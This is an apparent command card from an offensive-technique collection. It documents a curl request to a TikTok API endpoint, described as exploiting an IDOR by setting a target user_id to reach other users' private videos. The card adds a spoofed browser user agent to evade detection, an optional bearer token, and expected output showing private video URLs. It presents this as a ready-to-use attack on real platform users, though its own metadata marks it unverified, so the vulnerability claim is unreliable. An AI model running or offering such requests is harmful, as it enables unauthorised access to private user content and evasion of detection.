---
data: >-
  curl -X GET
  "https://api.tiktok.com/v1/videos/{video_id}?user_id={target_user_id}" -H
  "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -v
tags:
  - api
  - http
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 635a9b03-ebe1-4546-8a3e-7a07f1f1dea7
created_at: '2025-12-14T17:32:48.535Z'
updated_at: '2025-12-14T17:32:48.535Z'
verified: false
validated: true
submitted: true
---
# curl-api-request

## Command

```bash
curl -X GET "https://api.tiktok.com/v1/videos/{video_id}?user_id={target_user_id}" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -v
```

## Description

This command uses curl to send a GET request to a TikTok API endpoint, exploiting an IDOR by specifying a target user_id for private video access. It mimics a browser request to evade basic detection and includes verbose output for response analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `"https://api.tiktok.com/v1/videos/{video_id}?user_id={target_user_id}"` | The API URL with placeholders for video_id and target_user_id to manipulate | Yes |
| `-H "User-Agent: ..."` | Sets a realistic browser user agent to blend in | No |
| `-v` | Enables verbose mode for headers and errors | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.tiktok.com/v1/videos/123456?user_id=789012" -H "User-Agent: Mozilla/5.0"
```

### Advanced Usage

```bash
curl -X GET "https://api.tiktok.com/v1/videos/123456?user_id=789012" -H "User-Agent: Mozilla/5.0" -H "Authorization: Bearer {token}" -o response.json -v
```

Adds optional auth header (if needed) and saves output to file.

## Expected Output

On success: HTTP/1.1 200 OK followed by JSON like {"video_id": "123456", "url": "https://private-video-url", "private": true}. Errors may show 403 Forbidden if access is denied.

## Related

- [[Related Procedure: Exploit-IDOR-in-TikTok-API-for-Private-Video-Access]]
